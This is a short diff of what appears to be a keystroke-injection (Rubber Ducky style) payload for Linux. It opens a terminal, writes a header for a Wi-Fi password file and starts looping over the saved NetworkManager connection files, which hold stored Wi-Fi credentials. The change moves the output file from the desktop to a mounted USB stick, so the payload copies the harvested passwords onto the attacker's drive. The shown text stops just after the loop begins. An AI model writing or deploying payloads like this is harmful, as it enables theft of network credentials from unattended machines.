@@ -1,6 +1,6 @@
 CTRL ALT t
 DELAY 500
-STRING echo -e "Wireless_Network_Name Password\n--------------------- --------" > ~/Desktop/wifi_pass.txt
+STRING echo -e "Wireless_Network_Name Password\n--------------------- --------" > /media/$(hostname)/UsbStick/wifi_pass.txt
 ENTER
 STRING for FILE in /etc/NetworkManager/system-connections/*;
 ENTER
